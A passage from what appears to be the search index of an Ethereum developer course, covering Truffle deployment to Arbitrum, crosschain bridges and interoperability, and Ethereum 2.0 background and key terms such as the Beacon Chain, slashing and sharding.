Truffle where to store your build artifacts. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between ethereum and Arbitrum .","title":"Compiling"},{"location":"S08-scalability/M4-examples/L2-arbitrum/#migration","text":"Now that we've compiled the contract for Arbitrum, we can migrate it to an Arbitrum Layer 2 network. First, let's just try to our local Ganache, which will be almost similar to a normal Ethereum ganache instance: npm run migrate:arbitrum --network=ganache This may be a bit underwhelming! However, if we have loaded in our Infura Arbitrum Rinkeby network endpoint and have enough Arbitrum Rinkeby ETH in the wallet tied to the .env mnemonic, we can also run: npm run migrate:arbitrum --network=arbitrum_testnet Like standard Truffle, if you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.arbitrum.js --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) and add the --reset flag. Following the above steps should allow you to deploy to the Optimism Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 Ethereum using Layer 2 Arbitrum, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Arbitrum ecosystem. Furthermore, keep an eye out for new developments in Truffle tooling to assist with bridging L1-L2 data and execution.","title":"Migration"},{"location":"S08-scalability/M4-examples/L2-arbitrum/#additional-material","text":"Docs: Arbitrum Quickstart Tutorial: Truffle's Pet Shop Box on Arbitrum","title":"Additional Material"},{"location":"S08-scalability/M5-crosschain/L1/","text":"Crosschain Communication and Blockchain Interoperability In this section, we're going to discuss about why blockchain networks might want to communicate to each other and how that occurs. We mentioned way back in the \"Blockchain Fundamentals: Network Configurations\" section about the compatibility of certain blockchains and how they might link together. We're going to spend this lesson discussing this in more detail Why? From Peter Robinson: [T]here is no one blockchain to rule them all. There are public permissionless blockchains such as Ethereum Mainnet, Bitcoin, and Filecoin. There are many instances of permissioned, consortium blockchains such as Enterprise Ethereum / Quorum, Corda and Hyperledger Fabric. Within the public permissionless Ethereum space, Sidechains and Roll-ups (L2s) are emerging to improve scalability. All of these technologies need Crosschain Communications to allow them to communicate. Even if the world settled on one blockchain technology platform, all data and all functionality is unlikely to reside on just one instance of the blockchain platform. Crosschain communications allows data (state) and functionality (execution) that resides on one blockchain to be accessible from another blockchain. The seeds of crosschain communication can be found in the Bitcoin whitepaper. Under the section, \"Simplified Payment Verification,\" Nakamoto writes: It is possible to verify payments without running a full network node. A user only needs to keep a copy of the block headers of the longest proof-of-work chain, which he can get by querying network nodes until he's convinced he has the longest chain, and obtain the Merkle branch linking the transaction to the block it's timestamped in. He can't check the transaction for himself, but by linking it to a place in the chain, he can see that a network node has accepted it, and blocks added after it further confirm the network has accepted it. This \"light\" process proves the validity of a transaction by including the verified (mined) block header hash it appeared in as well as the Merkle Proof showing how the individual transaction is included in that hash. Developers realized they could use this implementation to build something that would validate Bitcoin payments on another chain entirely, and used it to build one of the first blockchain bridges, BTC Relay. Simplified Diagram of BTC Relay using transactions mined on Blockchain A to validate action on Blockchain B BTC Relay used the Simplified Payment Verification to move Ether from one account to the other using a Bitcoin transaction. Transactions could only be validated if the block header they relate to is on the longest chain and if at least six block headers have been posted on top of the block header that the transaction relates to. As attackers can not produce a longer chain than the main Bitcoin blockchain due to the mining difficulty, they are unable to confirm transactions based on a malicious fork. Other mechanisms of doing similar crosschain action include Hash Time Locked Contracts. These simple constructions allow two parties to exchange tokens on two separate blockchains without trusting each other. How? Crosschain communication relies on the concept of Atomicity. We previously spoke about atomicity in \"Trustless Consensus.\" An atomic message is accepted or rejected by a network, there is no in-between or halfway. Let's take a look at what that means: In the image above, a user submits a transaction that calls the crossSwap function on the Cons contract on the Source Blockchain . The function uses the message sender as the account to transfer from. The account to transfer to and the amount are specified by the to and the val parameters. If the user\u2019s account doesn\u2019t have a large enough balance then the transaction terminates with a revert error. Otherwise, the to and from account balances are updated and a crosschain function call is executed to execute the destination blockchain part of the crosschain transaction. Along with Atomicity, crosschain communication also requires Liveness of the networks involved. This means that the network is progressing in a stable, safe way. For example, the BTC Relay only works if the Ethereum network keeps up with the blocks being mined on Bitcoin. Only a series of uninterrupted Bitcoin blocks transmitted to the Ethereum smart contract (\"liveness\") will allow the Simplified Payment Verification to work. Without liveness, the networks involved cannot capture the crosschain communication and incorporate it into their respective global states. Events Many EVM-based protocols rely on transferring information between blockchains using Events. Transactions that trigger events programmatically generate log events that are stored in transaction receipts. The transaction receipts for all transactions in a block are stored in a modified Merkle Patricia Tree. The root hash of this tree is stored in the Ethereum block header. The log event information includes: the address of the contract that emitted the event, an identifier known as a topic that specifies the type of event that is emitted, and a data blob containing the encoded event parameters. This ability to programmatically produce events can be used to produce information on a source blockchain that can be consumed on a destination blockchain. Examples of Crosschain and Blockchain Interoperability Celo Optics by cLabs Validators sign and transfer state roots to destination blockchains. Validators can be slashed on the source chain for signing invalid state roots. Cross-Chain Interoperability Protocol by Chainlink Connext's Noncustodial Xchain Transfer Protocol (NXTP) Uses HTLCs as the underlying crosschain consensus mechanism. Cosmos Inter-Blockchain Communication (IBC) A multi-blockchain system in which blockchains called Zones communicate transactions via a central blockchain called a Hub. The Zones and the Hub typically use Tendermint a type of Practical Byzantine Fault Tolerance consensus algorithm. Rainbow Bridge by NEAR Protocol Uses NEAR's Rust execution environment to power crosschain Simplified Payment Verification transactions with a threshold number of validators to attest. Polkadot Uses a relay chain to coordinate information across many \"parachains\" . The parachains can also \"connect with external networks via bridges.\" BSC's Binance Bridge This is a two-way bridge between Binance's Smart Contract network (which is EVM-compatible) and Ethereum mainnet. Additional Material Video: Building Bridges, Not Walled Gardens An argument for bridges and crosschain communication from James Prestwich of cLabs. Academic Article: Survey of Crosschain Communications Protocols (Peter Robinson) A comprehensive technical overview of the requirements and characteristics of crosschain communication. Academic Article: General Purpose Atomic Crosschain Transaction protocol A standardized, composable way to conduct crosschain transactions across EVM blockchains. Article: Logging Events Using Smart Contracts (Ethereum.org) Wiki: Chainlist A list of EVM-compatible networks Wiki: Crosschain Comparison (Peter Robinson) Article: Blockchain Interoperability: An Overview Of The Current Research (ConsenSys) Article: Build {on} bridges, not [behind] walls (Andrew Hong) An analysis of the current state of bridges in blockchain networks.","title":"Crosschain Communication and Blockchain Interoperability"},{"location":"S08-scalability/M5-crosschain/L1/#crosschain-communication-and-blockchain-interoperability","text":"In this section, we're going to discuss about why blockchain networks might want to communicate to each other and how that occurs. We mentioned way back in the \"Blockchain Fundamentals: Network Configurations\" section about the compatibility of certain blockchains and how they might link together. We're going to spend this lesson discussing this in more detail","title":"Crosschain Communication and Blockchain Interoperability"},{"location":"S08-scalability/M5-crosschain/L1/#why","text":"From Peter Robinson: [T]here is no one blockchain to rule them all. There are public permissionless blockchains such as Ethereum Mainnet, Bitcoin, and Filecoin. There are many instances of permissioned, consortium blockchains such as Enterprise Ethereum / Quorum, Corda and Hyperledger Fabric. Within the public permissionless Ethereum space, Sidechains and Roll-ups (L2s) are emerging to improve scalability. All of these technologies need Crosschain Communications to allow them to communicate. Even if the world settled on one blockchain technology platform, all data and all functionality is unlikely to reside on just one instance of the blockchain platform. Crosschain communications allows data (state) and functionality (execution) that resides on one blockchain to be accessible from another blockchain. The seeds of crosschain communication can be found in the Bitcoin whitepaper. Under the section, \"Simplified Payment Verification,\" Nakamoto writes: It is possible to verify payments without running a full network node. A user only needs to keep a copy of the block headers of the longest proof-of-work chain, which he can get by querying network nodes until he's convinced he has the longest chain, and obtain the Merkle branch linking the transaction to the block it's timestamped in. He can't check the transaction for himself, but by linking it to a place in the chain, he can see that a network node has accepted it, and blocks added after it further confirm the network has accepted it. This \"light\" process proves the validity of a transaction by including the verified (mined) block header hash it appeared in as well as the Merkle Proof showing how the individual transaction is included in that hash. Developers realized they could use this implementation to build something that would validate Bitcoin payments on another chain entirely, and used it to build one of the first blockchain bridges, BTC Relay. Simplified Diagram of BTC Relay using transactions mined on Blockchain A to validate action on Blockchain B BTC Relay used the Simplified Payment Verification to move Ether from one account to the other using a Bitcoin transaction. Transactions could only be validated if the block header they relate to is on the longest chain and if at least six block headers have been posted on top of the block header that the transaction relates to. As attackers can not produce a longer chain than the main Bitcoin blockchain due to the mining difficulty, they are unable to confirm transactions based on a malicious fork. Other mechanisms of doing similar crosschain action include Hash Time Locked Contracts. These simple constructions allow two parties to exchange tokens on two separate blockchains without trusting each other.","title":"Why?"},{"location":"S08-scalability/M5-crosschain/L1/#how","text":"Crosschain communication relies on the concept of Atomicity. We previously spoke about atomicity in \"Trustless Consensus.\" An atomic message is accepted or rejected by a network, there is no in-between or halfway. Let's take a look at what that means: In the image above, a user submits a transaction that calls the crossSwap function on the Cons contract on the Source Blockchain . The function uses the message sender as the account to transfer from. The account to transfer to and the amount are specified by the to and the val parameters. If the user\u2019s account doesn\u2019t have a large enough balance then the transaction terminates with a revert error. Otherwise, the to and from account balances are updated and a crosschain function call is executed to execute the destination blockchain part of the crosschain transaction. Along with Atomicity, crosschain communication also requires Liveness of the networks involved. This means that the network is progressing in a stable, safe way. For example, the BTC Relay only works if the Ethereum network keeps up with the blocks being mined on Bitcoin. Only a series of uninterrupted Bitcoin blocks transmitted to the Ethereum smart contract (\"liveness\") will allow the Simplified Payment Verification to work. Without liveness, the networks involved cannot capture the crosschain communication and incorporate it into their respective global states.","title":"How?"},{"location":"S08-scalability/M5-crosschain/L1/#events","text":"Many EVM-based protocols rely on transferring information between blockchains using Events. Transactions that trigger events programmatically generate log events that are stored in transaction receipts. The transaction receipts for all transactions in a block are stored in a modified Merkle Patricia Tree. The root hash of this tree is stored in the Ethereum block header. The log event information includes: the address of the contract that emitted the event, an identifier known as a topic that specifies the type of event that is emitted, and a data blob containing the encoded event parameters. This ability to programmatically produce events can be used to produce information on a source blockchain that can be consumed on a destination blockchain.","title":"Events"},{"location":"S08-scalability/M5-crosschain/L1/#examples-of-crosschain-and-blockchain-interoperability","text":"Celo Optics by cLabs Validators sign and transfer state roots to destination blockchains. Validators can be slashed on the source chain for signing invalid state roots. Cross-Chain Interoperability Protocol by Chainlink Connext's Noncustodial Xchain Transfer Protocol (NXTP) Uses HTLCs as the underlying crosschain consensus mechanism. Cosmos Inter-Blockchain Communication (IBC) A multi-blockchain system in which blockchains called Zones communicate transactions via a central blockchain called a Hub. The Zones and the Hub typically use Tendermint a type of Practical Byzantine Fault Tolerance consensus algorithm. Rainbow Bridge by NEAR Protocol Uses NEAR's Rust execution environment to power crosschain Simplified Payment Verification transactions with a threshold number of validators to attest. Polkadot Uses a relay chain to coordinate information across many \"parachains\" . The parachains can also \"connect with external networks via bridges.\" BSC's Binance Bridge This is a two-way bridge between Binance's Smart Contract network (which is EVM-compatible) and Ethereum mainnet.","title":"Examples of Crosschain and Blockchain Interoperability"},{"location":"S08-scalability/M5-crosschain/L1/#additional-material","text":"Video: Building Bridges, Not Walled Gardens An argument for bridges and crosschain communication from James Prestwich of cLabs. Academic Article: Survey of Crosschain Communications Protocols (Peter Robinson) A comprehensive technical overview of the requirements and characteristics of crosschain communication. Academic Article: General Purpose Atomic Crosschain Transaction protocol A standardized, composable way to conduct crosschain transactions across EVM blockchains. Article: Logging Events Using Smart Contracts (Ethereum.org) Wiki: Chainlist A list of EVM-compatible networks Wiki: Crosschain Comparison (Peter Robinson) Article: Blockchain Interoperability: An Overview Of The Current Research (ConsenSys) Article: Build {on} bridges, not [behind] walls (Andrew Hong) An analysis of the current state of bridges in blockchain networks.","title":"Additional Material"},{"location":"S09-beyond-code/M1-EIPs/","text":"Title","title":"Index"},{"location":"S09-beyond-code/M1-EIPs/#title","text":"","title":"Title"},{"location":"S09-beyond-code/M2-ethics/","text":"Title","title":"Index"},{"location":"S09-beyond-code/M2-ethics/#title","text":"","title":"Title"},{"location":"S09-beyond-code/M3-continuing-ed/","text":"Title","title":"Index"},{"location":"S09-beyond-code/M3-continuing-ed/#title","text":"","title":"Title"},{"location":"S09-beyond-code/M4-spirit/","text":"Title","title":"Index"},{"location":"S09-beyond-code/M4-spirit/#title","text":"","title":"Title"},{"location":"S10-eth2/M1-background/","text":"A Brief History Ever since the launch of Ethereum in 2015, there have been plans to update its core protocol significantly. In December 2015, five months after the launch of Ethereum mainnet, Vitalik Buterin wrote a post describing the roadmap and eventual adoption of Ethereum 2.0: Buterin's post describing Ethereum roadmap, including Ethereum 2.0 AKA Serenity As we've discussed earlier, Ethereum has been able to regularly update its protocol through multiple, coordinated network hard forks ( no small feat! ) to meet these roadmap requirements. However, these have primarily been upgrades within the constructs of the Ethereum protocol originally formulated in the Yellow Paper and launched in 2015. Changes made to the protocol since 2015 can been seen as reactive adjustments to the realities of running a cryptocurrency network. If we were to think of the Ethereum network as a house, launch of Ethereum mainnet was the building of the house and everyone moving in. Network forks are the patches, repairs and additional features to address challenges that arise from more people moving into the house. The upgrade to Ethereum 2.0 (\"Serenity\" on the roadmap) will be akin to building an entirely new foundation and house to accommodate the next generation of network growth. (With regards to the mental model we've discussed earlier, the Ethereum 2.0 migration is an updating of the consensus mechanism, as circled below:) But we have this huge community and entire businesses in the current Ethereum home (called \"Ethereum 1.x\"). We can't risk moving everyone in to an entirely new house and then discovering a catastrophic error. Therefore, Ethereum 2.0 is being introduced in a series of phases. Imagine the Ethereum 2.0 house being beside the Ethereum 1.x home. At first, there will be a path connecting the two. Ultimately, Ethereum 2.0 will expand to include Ethereum 1.x within it. Launch of Beacon Chain (Proof-of-Stake) Phases 0 is the implementation of a Proof of Stake consensus mechanism for Ethereum. The blockchain secured by Phase 0's PoS mechanism is called the Beacon Chain. Miners for the Beacon Chain are called validators . In Proof of Work, miners must exert CPU to find a block and nonce that meets the difficulty. In Proof of Stake, the validators stake financial value to the blocks they propose and approve. They also are watching all the other validators to make sure no one is proposing incorrect blocks (containing errors or fraudulent activity). If a validator is caught proposing or confirming invalid blocks, they will be slashed (their financial stake is penalized). Phase 0 is the phase most public one now, as it's currently undergoing public testing and there are multiple companies developing software for it. Here is a list of the main validator clients: Teku \u2014 Java-based client developed by ConsenSys Software Prysm \u2014 Go-based client developed by Prysmatic Labs Lighthouse \u2014 Rust-based client developed by Sigma Prime Lodestar \u2014 JavaScript-based client Nimbus \u2014 Nim-based client developed by Status The Medalla testnet was the first, public, multi-client testnet available. You can check out its progress here and join the testnet by following these steps. Beacon Chain Launch On October 14, 2020, the Beacon Chain deposit contract went live on Ethereum mainnet (L1) and people interested in validators could start locking up their ETH for validating using Launchpad. On November 24, 2020, the minimum amount of ETH needed to start the Beacon Chain (524,288) was reached, which triggered the go-live mechanism to start the network in seven days. On December 1st at 12pm UTC, the Beacon chain\u2019s first blocks were validated. The first block came from Validator 19026, with the enigmatic graffiti, \u201cMr F was here.\u201d Twelve seconds later came the next block, graffiti indicating the validator might be located in Zug, Switzerland. The Eth2 Beacon Chain grew steadily, block by block every 12 seconds. Then came the next hurdle: would enough validators be online to finalize the first Epoch? Yes! 82.27% of the validators attested to the validity of the Epoch 0, the proverbial ground floor of the Beacon Chain. You can see the latest blocks from the Beacon Chain on Beaconcha.in. Webinar Series About the Ethereum Merge to Proof-of-Stake from a Solo Stakers and DApp Developers Perspective In July / August 2022 the Infura team hosted a series of workshops explaining the impact the Merge will have on Solo Stakers and DApp Developers. The recordings, with a brief description are as follows: The Merge Overview: Where We Are and Where We're Going : The first session in the series, giving an overview of the Merge, general instructions about what Solo Stakers and DApp Developers must do in order to prepare for the Merge. Additional Material Ethereum 2.0 development develops and matures day-by-day. It can be challenging to keep up with the bleeding edge of this exciting new network. Here are some resources below to help: You can read the entire Ethereum 2.0 spec, including phases 0, 1 and 2 here. Ethereum 2.0 Glossary (ConsenSys) Ethereum 2.0 Terms Demystified Ethereum 2.0 Knowledge Base Report: ETH2, The Next Evolution of Cryptoeconomy (Messari) My Journey to Becoming a Validator on Ethereum 2.0 \u2014 Part 1 Coogan walks through a four-part series of becoming a validator on Ethereum 2.0. Started before the Beacon Chain launched! To follow the progress of Ethereum 2.0, subscribe to What's New in Eth2, which sends weekly updates. A Merge Timeline from AllCoreDevs (Tim Beiko) Ethereum\u2019s Merge Upgrade Goes Live Today on Ropsten Testnet","title":"Index"},{"location":"S10-eth2/M1-background/#a-brief-history","text":"Ever since the launch of Ethereum in 2015, there have been plans to update its core protocol significantly. In December 2015, five months after the launch of Ethereum mainnet, Vitalik Buterin wrote a post describing the roadmap and eventual adoption of Ethereum 2.0: Buterin's post describing Ethereum roadmap, including Ethereum 2.0 AKA Serenity As we've discussed earlier, Ethereum has been able to regularly update its protocol through multiple, coordinated network hard forks ( no small feat! ) to meet these roadmap requirements. However, these have primarily been upgrades within the constructs of the Ethereum protocol originally formulated in the Yellow Paper and launched in 2015. Changes made to the protocol since 2015 can been seen as reactive adjustments to the realities of running a cryptocurrency network. If we were to think of the Ethereum network as a house, launch of Ethereum mainnet was the building of the house and everyone moving in. Network forks are the patches, repairs and additional features to address challenges that arise from more people moving into the house. The upgrade to Ethereum 2.0 (\"Serenity\" on the roadmap) will be akin to building an entirely new foundation and house to accommodate the next generation of network growth. (With regards to the mental model we've discussed earlier, the Ethereum 2.0 migration is an updating of the consensus mechanism, as circled below:) But we have this huge community and entire businesses in the current Ethereum home (called \"Ethereum 1.x\"). We can't risk moving everyone in to an entirely new house and then discovering a catastrophic error. Therefore, Ethereum 2.0 is being introduced in a series of phases. Imagine the Ethereum 2.0 house being beside the Ethereum 1.x home. At first, there will be a path connecting the two. Ultimately, Ethereum 2.0 will expand to include Ethereum 1.x within it.","title":"A Brief History"},{"location":"S10-eth2/M1-background/#launch-of-beacon-chain-proof-of-stake","text":"Phases 0 is the implementation of a Proof of Stake consensus mechanism for Ethereum. The blockchain secured by Phase 0's PoS mechanism is called the Beacon Chain. Miners for the Beacon Chain are called validators . In Proof of Work, miners must exert CPU to find a block and nonce that meets the difficulty. In Proof of Stake, the validators stake financial value to the blocks they propose and approve. They also are watching all the other validators to make sure no one is proposing incorrect blocks (containing errors or fraudulent activity). If a validator is caught proposing or confirming invalid blocks, they will be slashed (their financial stake is penalized). Phase 0 is the phase most public one now, as it's currently undergoing public testing and there are multiple companies developing software for it. Here is a list of the main validator clients: Teku \u2014 Java-based client developed by ConsenSys Software Prysm \u2014 Go-based client developed by Prysmatic Labs Lighthouse \u2014 Rust-based client developed by Sigma Prime Lodestar \u2014 JavaScript-based client Nimbus \u2014 Nim-based client developed by Status The Medalla testnet was the first, public, multi-client testnet available. You can check out its progress here and join the testnet by following these steps.","title":"Launch of Beacon Chain (Proof-of-Stake)"},{"location":"S10-eth2/M1-background/#beacon-chain-launch","text":"On October 14, 2020, the Beacon Chain deposit contract went live on Ethereum mainnet (L1) and people interested in validators could start locking up their ETH for validating using Launchpad. On November 24, 2020, the minimum amount of ETH needed to start the Beacon Chain (524,288) was reached, which triggered the go-live mechanism to start the network in seven days. On December 1st at 12pm UTC, the Beacon chain\u2019s first blocks were validated. The first block came from Validator 19026, with the enigmatic graffiti, \u201cMr F was here.\u201d Twelve seconds later came the next block, graffiti indicating the validator might be located in Zug, Switzerland. The Eth2 Beacon Chain grew steadily, block by block every 12 seconds. Then came the next hurdle: would enough validators be online to finalize the first Epoch? Yes! 82.27% of the validators attested to the validity of the Epoch 0, the proverbial ground floor of the Beacon Chain. You can see the latest blocks from the Beacon Chain on Beaconcha.in.","title":"Beacon Chain Launch"},{"location":"S10-eth2/M1-background/#webinar-series-about-the-ethereum-merge-to-proof-of-stake-from-a-solo-stakers-and-dapp-developers-perspective","text":"In July / August 2022 the Infura team hosted a series of workshops explaining the impact the Merge will have on Solo Stakers and DApp Developers. The recordings, with a brief description are as follows: The Merge Overview: Where We Are and Where We're Going : The first session in the series, giving an overview of the Merge, general instructions about what Solo Stakers and DApp Developers must do in order to prepare for the Merge.","title":"Webinar Series About the Ethereum Merge to Proof-of-Stake from a Solo Stakers and DApp Developers Perspective"},{"location":"S10-eth2/M1-background/#additional-material","text":"Ethereum 2.0 development develops and matures day-by-day. It can be challenging to keep up with the bleeding edge of this exciting new network. Here are some resources below to help: You can read the entire Ethereum 2.0 spec, including phases 0, 1 and 2 here. Ethereum 2.0 Glossary (ConsenSys) Ethereum 2.0 Terms Demystified Ethereum 2.0 Knowledge Base Report: ETH2, The Next Evolution of Cryptoeconomy (Messari) My Journey to Becoming a Validator on Ethereum 2.0 \u2014 Part 1 Coogan walks through a four-part series of becoming a validator on Ethereum 2.0. Started before the Beacon Chain launched! To follow the progress of Ethereum 2.0, subscribe to What's New in Eth2, which sends weekly updates. A Merge Timeline from AllCoreDevs (Tim Beiko) Ethereum\u2019s Merge Upgrade Goes Live Today on Ropsten Testnet","title":"Additional Material"},{"location":"S10-eth2/M2-key-terms/","text":"Key Terms for Ethereum 2.0 There are some new terms that might be confusing with Ethereum 2.0, we wanted to list a few here to help you understand them better. First, we should mention there's a discussion around even the term \"Ethereum 2.0.\" Some folks would like there to just be the \"Application Layer\" and the \"Consensus Layer\". Here's the distinction, from Ethereum Foundation's Danny Ryan: What we call \u201ceth2\u201d is a series of major upgrades to Ethereum\u2019s consensus-layer \u2013 to ensure the protocol is secure, sustainable, and scalable \u2013 while \u201ceth2 clients\u201d are implementations of this proof-of-stake consensus. And, what we call \u201ceth1\u201d in this context is Ethereum\u2019s rich application-layer, and similarly, \u201ceth1 clients\u201d (after the upgrade to proof-of-stake) are the software that does the heavy lifting in this layer. Ethereum\u2019s application-layer is currently driven by a proof-of-work consensus algorithm but will soon be driven by the beacon chain \u2013 the proof-of-stake consensus mechanism that is currently in production and secured by ~7.7M ETH. People are still using the term Ethereum 2.0 or Eth2 (like we are in this course), but eventually both chains will just be \"Ethereum\"! Okay, here are some more Ethereum 2.0 terms and their explanations: Proof of Stake and Validators Proof of Stake is the new consensus mechanism for Ethereum. It currently is the consensus mechanism for the Beacon chain. Eventually, the Ethereum 1.0 chain will migrate to the Ethereum 2.0, replacing mainnet's consensus mechanism from Proof of Work to Proof of Stake. Actors that are validating the network state in the Beacon chain are called validators. Slashing Ethereum 2.0\u2019s consensus mechanism has a couple of rules that are designed to prevent attacks on the network. Any validator found to have broken these rules will be slashed and ejected from the network. Slashing means that a significant part of the validator\u2019s stake is removed: up to the whole stake of 32 ETH in the worst case. Slashing is interesting because it is a financial disincentive for behavior on public blockchains. As we read earlier about Proof of Work, there are only incentives for people to act in accordance with the network consensus layer. Staking Pools and Staking-as-a-Service Staking as a Service is where you give your (32*n) ETH to a service which handles all of the validating process for you for a fee. Much easier mental load, great for institutional interest. For people with less than 32ETH (which has become very expensive now!), there are some interesting options of decentralized pools where you can contribute either validator power or less than 32ETH. The staking pools combine that and distribute the staking rewards accordingly. A full list of these services can be found here. The Ethereum Due Diligence Committee is doing their best to provide an unbiased assessment of these services. Deposit Contract The Deposit contract is the pivot point from Ethereum mainnet to the Beacon Chain for actors wishing to become validators on the Beacon Chain. In order to register as a validator on the network, a user must generate Ethereum 2.0 keys by making a one-way deposit of ETH into the official deposit contract. (You should not send ETH to this contract directly! You will lose those funds forever!) Finality Proof of Stake consensus mechanisms offer finality: After a small period of time, a block is declared final, which means that it can never be changed. All the transactions in that block and all previous transactions are permanent, immutable, and guaranteed forever. However, Finality presents some issues around Weak Subjectivity: If \u2153 of validators withdraw their stake and continue signing blocks and attestations, they can form a chain which conflicts with the finalized state. If your node is far enough behind the chain head to not be aware that they\u2019ve withdrawn their funds, the exited validators can trick you into following the wrong chain. ( source ) Well-behaved validators who have successfully and properly exited the chain can sell their private keys on the black market to a malicious actor. (There is no financial disincentive for them to do this as their funds have safely exited the protocol). You can read more about Weak Subjectivity and how to address it here. Secret Shared Validators (SSV) From the SSV.network page: Secret Shared Validators (SSV) is the first secure and robust way to split a validator key for ETH staking between non-trusting nodes, or operators. The protocol enables the distributed control and operation of an Ethereum validator. The key is split in such a way that no operator must trust the other to operate, a certain amount can go offline without affecting network performance, and no operator can take unilateral control of the network. The result is decentralization, fault tolerance, and optimal security for staking on Ethereum. Database Sharding Database sharding is used in conventional computer programming to increases scalability of large systems. From this article: A database shard is a horizontal partition of data in a database or search engine. Each individual partition is referred to as a shard or database shard. Each shard is held on a separate database server instance, to spread load. Some data within a database remains present in all shards, but some appears only in a single shard. Each shard (or server) acts as the single source for this subset of data. Ethereum 2.0 leverages traditional database sharding to decrease the amount of memory needed to maintain the full state of the network. Originally meant to be 1024 shards, the current spec will produce 64 database shards. Each of these shards will have their own validators. They will periodically check into the beacon chain using crosslinks, which is a summary of the state of that shard and the only representation of the shard on the Beacon Chain. Phase 1 is meant to reduce the resources needed to use Ethereum in a decentralized way. Currently, to interact with Ethereum network on your own node, it requires 500GB of memory and significant RAM, not to mention syncing time. With sharding and light clients, the idea is to decrease the amount of information needed to submit your own, valid transactions. Read more about sharding on Ethereum 2.0 here. BLS Encryption The key signature system Ethereum 2.0 will be using is BLS. BLS allows multiple digital signatures to be collapsed into a single verifiable one. This is helpful with collecting attestations of the beacon ( \u201cvotes in regards to the validity of a shard block or beacon\u201d ). Most pertinent for us, the BLS scheme is different from the scheme used for Ethereum 1.0. To swap out the encryption curve, Ethereum core developers have come up with a clever solution, which is a classic handshake: In the diagram above, the blue key and boxes represent Ethereum 1.0 and its cryptographic scheme and the red key and boxes represent Ethereum 2.0 and its cryptographic scheme. The deposit contract, which exists on Ethereum 1.0 Mainnet, allows the user to prove they have private keys for Ethereum 1.0 and Ethereum 2.0. Here\u2019s how that works: The transaction submitted to the deposit contract on Ethereum 1.0 has to be signed by an Ethereum 1.0 private key (like any transaction submitted on Mainnet). However, that transaction is wrapped around another private key signature, the Ethereum 2.0 private key. The beacon chain is watching the deposit contract on Ethereum 1.0, if a valid transaction is submitted to the contract with the correct balance, the beacon chain then unwraps the first layer of encryption and accesses the second layer, the Ethereum 2.0 digital signature. That is used to confirm the Ethereum 2.0 validator address and connect it to an Ethereum 1.0 address. Here's how that handshake looks in the Beacon Chain contract deployed to Ethereum mainnet: Execution Environments (Computation) The final phase of Ethereum 2.0 deals with the execution environments present on each shard. in Ethereum 1.x, the execution environment is the Ethereum Virtual Machine, a Turing-complete programming language that provides a universal computation environment for all in the network to use. However, this universality comes at an efficiency cost. The EVM is slow compared to modern processing languages. Phase 2 addresses this processing cost by using a version of WebAssembly , a new type of code developed by Mozilla. It allows code written in C, C++ or Rust but executed in the browser to run at near-native speeds. (For more information about the implications of WebAssembly for the broader web, please see this video: \"Rust, WebAssembly and the Future of Serverless\" ) In Phase 2, each shard will be allowed a unique execution environment. While at least one will be running the EVM (for sake of continuity), it's possible others will be running execution environments (EEs) for Libra, Bitcoin, or any other blockchain network. Note: This may change as the Eth1-Eth2 merge gets closer. It seems as though the emphasis may be on getting the Beacon Chain executable on EVM, rather than various execution environments. Additional Material Ethereum 2.0 Glossay (ConsenSys) Beaconcha.in Knowledge Base Ethereum 2.0 (Ethhub.io) What's New in Eth2 (Ben Edgington) Great newsletter round-up Finalized article series by Danny Ryan For more information about BLS, please see this thread from Jeff Coleman or this Reddit post about the history of BLS development for Ethereum 2.0.","title":"Index"},{"location":"S10-eth2/M2-key-terms/#key-terms-for-ethereum-20","text":"There are some new terms that might be confusing with Ethereum 2.0, we wanted to list a few here to help you understand them better. First, we should mention there's a discussion around even the term \"Ethereum 2.0.\" Some folks would like there to just be the \"Application Layer\" and the \"Consensus Layer\". Here's the distinction, from Ethereum Foundation's Danny Ryan: What we call \u201ceth2\u201d is a series of major upgrades to Ethereum\u2019s consensus-layer \u2013 to ensure the protocol is secure, sustainable, and scalable \u2013 while \u201ceth2 clients\u201d are implementations of this proof-of-stake consensus. And, what we call \u201ceth1\u201d in this context is Ethereum\u2019s rich application-layer, and similarly, \u201ceth1 clients\u201d (after the upgrade to proof-of-stake) are the software that does the heavy lifting in this layer. Ethereum\u2019s application-layer is currently driven by a proof-of-work consensus algorithm but will soon be driven by the beacon chain \u2013 the proof-of-stake consensus mechanism that is currently in production and secured by ~7.7M ETH. People are still using the term Ethereum 2.0 or Eth2 (like we are in this course), but eventually both chains will just be \"Ethereum\"! Okay, here are some more Ethereum 2.0 terms and their explanations:","title":"Key Terms for Ethereum 2.0"},{"location":"S10-eth2/M2-key-terms/#proof-of-stake-and-validators","text":"Proof of Stake is the new consensus mechanism for Ethereum. It currently is the consensus mechanism for the Beacon chain. Eventually, the Ethereum 1.0 chain will migrate to the Ethereum 2.0, replacing mainnet's consensus mechanism from Proof of Work to Proof of Stake. Actors that are validating the network state in the Beacon chain are called validators.","title":"Proof of Stake and Validators"},{"location":"S10-eth2/M2-key-terms/#slashing","text":"Ethereum 2.0\u2019s consensus mechanism has a couple of rules that are designed to prevent attacks on the network. Any validator found to have broken these rules will be slashed and ejected from the network. Slashing means that a significant part of the validator\u2019s stake is removed: up to the whole stake of 32 ETH in the worst case. Slashing is interesting because it is a financial disincentive for behavior on public blockchains. As we read earlier about Proof of Work, there are only incentives for people to act in accordance with the network consensus layer.","title":"Slashing"},{"location":"S10-eth2/M2-key-terms/#staking-pools-and-staking-as-a-service","text":"Staking as a Service is where you give your (32*n) ETH to a service which handles all of the validating process for you for a fee. Much easier mental load, great for institutional interest. For people with less than 32ETH (which has become very expensive now!), there are some interesting options of decentralized pools where you can contribute either validator power or less than 32ETH. The staking pools combine that and distribute the staking rewards accordingly. A full list of these services can be found here. The Ethereum Due Diligence Committee is doing their best to provide an unbiased assessment of these services.","title":"Staking Pools and Staking-as-a-Service"},{"location":"S10-eth2/M2-key-terms/#deposit-contract","text":"The Deposit contract is the pivot point from Ethereum mainnet to the Beacon Chain for actors wishing to become validators on the Beacon Chain. In order to register as a validator on the network, a user must generate Ethereum 2.0 keys by making a one-way deposit of ETH into the official deposit contract. (You should not send ETH to this contract directly! You will lose those funds forever!)","title":"Deposit Contract"},{"location":"S10-eth2/M2-key-terms/#finality","text":"Proof of Stake consensus mechanisms offer finality: After a small period of time, a block is declared final, which means that it can never be changed. All the transactions in that block and all previous transactions are permanent, immutable, and guaranteed forever. However, 